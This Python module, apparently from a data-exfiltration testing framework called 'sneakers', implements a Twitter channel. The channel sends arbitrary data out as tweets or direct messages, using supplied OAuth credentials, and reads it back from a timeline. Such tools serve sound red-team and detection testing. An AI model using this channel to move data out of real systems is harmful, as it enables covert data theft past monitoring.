from sneakers.modules import Channel
from sneakers.errors import ExfilChannel

from twython import Twython, TwythonError

class Twitter(Channel):
    info = {
        "name": "Twitter",
        "author": "Gabriel Butterick & Bonnie Ishiguro (davinerd minor changes)",
        "description": "Posts data to Twitter as a series of 140 character Tweets",
        "comments": []
    }

    requiredParams = {
        'sending': {
            'key':      'Application key for Twitter API.',
            'secret':   'Application secret for Twitter API.',
            'token':    'OAuth token for Twitter API.',
            'tsecret':  'OAuth token secret for Twitter API.',
            'name':     'Screen name of Twitter account to post data to.'
        },
        'receiving': {
            'key':      'Application key for Twitter API.',
            'secret':   'Application secret for Twitter API.',
            'token':    'OAuth token for Twitter API.',
            'tsecret':  'OAuth token secret for Twitter API.',
            'name':     'Screen name of Twitter account to post data to.'
        }
    }

    optionalParams = {
        'sending': {
            'DM': False
        },
        'receiving': {
            'DM': False,
            'ids': list()
        }
    }

    # Can only post 100 times per hour or 1000 times per day
    max_length = 140
    max_hourly = 100

    def send(self, data):
        send_params = self.reqParams['sending']
        opt_params = self.optParams['sending']

        APP_KEY = send_params['key']
        APP_SECRET = send_params['secret']
        OAUTH_TOKEN = send_params['token']
        OAUTH_TOKEN_SECRET = send_params['tsecret']

        try:
            twitter = Twython(APP_KEY, APP_SECRET, OAUTH_TOKEN, OAUTH_TOKEN_SECRET)

            if opt_params and opt_params['DM']:
                result = twitter.send_direct_message(screen_name=send_params['name'], text=data)
            else:
                result = twitter.update_status(status=data)
        except Exception as err:
            raise ExfilChannel("Error sending tweets: {0}".format(err))

        return result['id_str']

    def receive(self):
        rec_params = self.reqParams['receiving']
        opt_params = self.optParams['receiving']
        tweets = list()
        user_timeline = list()

        APP_KEY = rec_params['key']
        APP_SECRET = rec_params['secret']
        OAUTH_TOKEN = rec_params['token']
        OAUTH_TOKEN_SECRET = rec_params['tsecret']
        SCREEN_NAME = rec_params['name']

        twitter = Twython(APP_KEY, APP_SECRET, OAUTH_TOKEN, OAUTH_TOKEN_SECRET)

        try:
            if opt_params['DM']:
                if 'ids' in opt_params and len(opt_params['ids']) > 0:
                    for idz in opt_params['ids']:
                        dm = twitter.get_direct_message(id=idz)
                        user_timeline.append(dm)
                else:
                    user_timeline = twitter.get_direct_messages()
            else:
                if 'ids' in opt_params and len(opt_params['ids']) > 0:
                    for idz in opt_params['ids']:
                        tweet = twitter.show_status({'id': idz})
                        user_timeline.append(tweet)
                else:
                    user_timeline = twitter.get_user_timeline(screen_name=SCREEN_NAME)

            for x in user_timeline:
                if 'text' in x:
                    tweets.append(x['text'])

        except Exception as err:
            raise ExfilChannel("Error retrieving tweets: {0}".format(err))

        return tweets

